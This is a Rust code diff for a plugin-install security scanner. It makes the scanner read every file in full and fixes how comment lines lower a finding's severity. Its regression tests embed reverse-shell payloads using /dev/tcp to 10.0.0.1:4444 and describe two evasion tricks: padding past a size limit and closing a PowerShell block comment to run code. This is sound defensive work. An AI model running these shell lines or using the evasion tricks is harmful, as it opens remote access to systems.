@@ -12,14 +12,15 @@
 //! `--force`, and a scanner failure refuses the install (fail closed).
 
 use std::fmt::Write as _;
-use std::path::Path;
+use std::path::{Path, PathBuf};
 
 use pmt_core::error::{Error, codes};
 use pmt_plugins::install::Staged;
 use pmt_plugins::record::Flags;
-use pmt_skills::scan::{PatternScanner, Report, Scanner as _, Verdict};
+use pmt_skills::scan::{Finding, PatternScanner, Report, Scanner as _, Verdict};
 
 mod comments;
+mod read;
 
 /// Text the agent reads: a finding there keeps its severity.
 const AGENT_READ: &[&str] = &["SKILL.md", "AGENTS.md", "CLAUDE.md", "plugin.toml"];
@@ -27,8 +28,6 @@ const AGENT_READ: &[&str] = &["SKILL.md", "AGENTS.md", "CLAUDE.md", "plugin.toml
 const PROSE_EXTENSIONS: &[&str] = &["md", "markdown", "txt", "rst", "adoc"];
 /// Directories holding test fixtures.
 const TEST_DIRS: &[&str] = &["test", "tests", "fixtures", "testdata", "__tests__"];
-/// The largest file read (bigger files are scanned up to this many bytes).
-const MAX_FILE_BYTES: u64 = 4 * 1024 * 1024;
 
 /// Why the scan refused a plugin.
 pub(super) struct Refused {
@@ -150,39 +149,28 @@ fn findings(id: &str, report: &Report) -> String {
     text
 }
 
-/// Scans every file under `dir` and grades the tree.
+/// Scans every file under `dir`, each in full, and grades the tree.
 ///
 /// # Errors
 ///
-/// A file that cannot be read, or a symbolic link (the scan cannot vouch
-/// for what it points at).
+/// A file that cannot be read or holds a text line too long to scan, or a
+/// symbolic link (the scan cannot vouch for what it points at).
 pub(crate) fn scan(dir: &Path) -> Result<Report, String> {
     let mut files = Vec::new();
     collect(dir, dir, &mut files)?;
-    let mut report = PatternScanner.scan(&files)?;
-    let texts: std::collections::HashMap<&str, &[u8]> = files
-        .iter()
-        .map(|(path, bytes)| (path.as_str(), bytes.as_slice()))
-        .collect();
-    for finding in &mut report.findings {
-        let text = texts
-            .get(finding.file.as_str())
-            .and_then(|bytes| std::str::from_utf8(bytes).ok())
-            .unwrap_or_default();
-        if lowered(&finding.file, text, finding.line) {
-            finding.severity = lower(finding.severity);
-        }
+    let mut findings = Vec::new();
+    for (relative, path) in &files {
+        findings.extend(scan_file(relative, path).map_err(|e| format!("{relative}: {e}"))?);
     }
-    report.verdict = report
-        .findings
+    let verdict = findings
         .iter()
         .map(|f| f.severity)
         .max()
         .unwrap_or(Verdict::Safe);
-    Ok(report)
+    Ok(Report { verdict, findings })
 }
 
-fn collect(root: &Path, dir: &Path, files: &mut Vec<(String, Vec<u8>)>) -> Result<(), String> {
+fn collect(root: &Path, dir: &Path, files: &mut Vec<(String, PathBuf)>) -> Result<(), String> {
     let mut entries: Vec<_> = std::fs::read_dir(dir)
         .map_err(|e| format!("{}: {e}", dir.display()))?
         .collect::<Result<_, _>>()
@@ -204,29 +192,77 @@ fn collect(root: &Path, dir: &Path, files: &mut Vec<(String, Vec<u8>)>) -> Resul
         if kind.is_dir() {
             collect(root, &path, files)?;
         } else if relative != pmt_plugins::digest::INSTALL_RECORD {
-            let bytes = read_capped(&path).map_err(|e| format!("{relative}: {e}"))?;
-            files.push((relative, bytes));
+            files.push((relative, path));
         }
     }
     Ok(())
 }
 
-fn read_capped(path: &Path) -> std::io::Result<Vec<u8>> {
-    use std::io::Read as _;
-    let mut bytes = Vec::new();
-    std::fs::File::open(path)?
-        .take(MAX_FILE_BYTES)
-        .read_to_end(&mut bytes)?;
-    Ok(bytes)
+/// The findings in one file, read a run of lines at a time, with their
+/// severity lowered where [`weight`] says so.
+fn scan_file(relative: &str, path: &Path) -> Result<Vec<Finding>, String> {
+    let name = relative.rsplit('/').next().unwrap_or(relative);
+    let mut language = comments::Language::of(name);
+    // Each finding with whether its line reads as a comment; whether
+    // comments count is known only after the file's first two lines.
+    let mut found: Vec<(Finding, bool)> = Vec::new();
+    let kind = read::segments(path, |text, lines_before| {
+        for (index, line) in text
+            .lines()
+            .enumerate()
+            .take(2_usize.saturating_sub(lines_before))
+        {
+            language.observe(lines_before + index + 1, line);
+        }
+        let report = PatternScanner.scan(&[(relative.to_owned(), text.as_bytes().to_vec())])?;
+        if report.findings.is_empty() {
+            return Ok(());
+        }
+        let lines: Vec<&str> = text.lines().collect();
+        for mut finding in report.findings {
+            let comment = lines
+                .get(finding.line - 1)
+                .is_some_and(|line| language.is_comment(line));
+            finding.line += lines_before;
+            found.push((finding, comment));
+        }
+        Ok(())
+    })?;
+    if kind == read::Kind::Binary {
+        return Ok(Vec::new());
+    }
+    let weight = weight(relative);
+    Ok(found
+        .into_iter()
+        .map(|(mut finding, comment)| {
+            let lowered = match weight {
+                Weight::Full => false,
+                Weight::Lowered => true,
+                Weight::ByComment => comment && language.has_comments(),
+            };
+            if lowered {
+                finding.severity = lower(finding.severity);
+            }
+            finding
+        })
+        .collect())
 }
 
-/// Whether a finding in `file` (contents `text`) on `line` is lowered one
-/// step.
-fn lowered(file: &str, text: &str, line: usize) -> bool {
+/// How a file's findings weigh, by its path.
+enum Weight {
+    /// Text the agent reads.
+    Full,
+    /// Prose, changelogs and test fixtures.
+    Lowered,
+    /// Lowered on lines that are entirely a comment (see [`comments`]).
+    ByComment,
+}
+
+fn weight(file: &str) -> Weight {
     let parts: Vec<&str> = file.split('/').collect();
     let name = parts.last().copied().unwrap_or_default();
     if parts.first() == Some(&"skills") || AGENT_READ.contains(&name) {
-        return false;
+        return Weight::Full;
     }
     let lower_name = name.to_ascii_lowercase();
     let prose = Path::new(name)
@@ -239,7 +275,11 @@ fn lowered(file: &str, text: &str, line: usize) -> bool {
         .any(|d| TEST_DIRS.contains(d))
         || lower_name.starts_with("test_")
         || lower_name.contains("_test.");
-    prose || changelog || fixture || comments::is_comment(name, text, line)
+    if prose || changelog || fixture {
+        Weight::Lowered
+    } else {
+        Weight::ByComment
+    }
 }
 
 const fn lower(severity: Verdict) -> Verdict {
@@ -341,6 +381,52 @@ mod tests {
                 .all(|f| f.severity == Verdict::Dangerous),
             "{:?}",
             report.findings
+        );
+    }
+
+    #[test]
+    fn a_threat_past_the_first_megabytes_of_a_file_is_found() {
+        // Regression: only the first 4 MiB of a file were read, so a
+        // reverse shell after 4.3 MB of padding installed without --force.
+        let pad = "# pad\n".repeat(750_000);
+        let dir = tree(&[("setup.sh", &format!("#!/bin/sh\n{pad}{SHELL}"))]);
+        let report = scan(dir.path()).unwrap();
+        assert_eq!(report.verdict, Verdict::Dangerous);
+        assert_eq!(
+            report.summary(),
+            "dangerous (reverse_shell in setup.sh:750002)"
+        );
+    }
+
+    #[test]
+    fn a_text_line_too_long_to_scan_fails_the_scan() {
+        let line = "a".repeat(read::MAX_LINE_BYTES + 2 * 1024 * 1024);
+        let dir = tree(&[("setup.sh", &format!("#!/bin/sh\n{line}{SHELL}"))]);
+        let error = scan(dir.path()).unwrap_err();
+        assert_eq!(
+            error,
+            "setup.sh: line 2 is longer than 8 MiB, too long to scan"
+        );
+    }
+
+    #[test]
+    fn code_after_a_powershell_block_comment_closes_keeps_full_severity() {
+        // Regression: `#> code` closes a `<#` block and runs `code`, but
+        // the `#` line was lowered as a comment and `--force` installed it.
+        let dir = tree(&[
+            (
+                "setup.ps1",
+                "<#\n#> Start-Process bash -ArgumentList '-c','bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\n",
+            ),
+            (
+                "tool.psm1",
+                "<#\n#> Start-Process bash -ArgumentList -c,bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
+            ),
+        ]);
+        let report = scan(dir.path()).unwrap();
+        assert_eq!(
+            report.summary(),
+            "dangerous (reverse_shell in setup.ps1:2, reverse_shell in tool.psm1:2)"
         );
     }
 
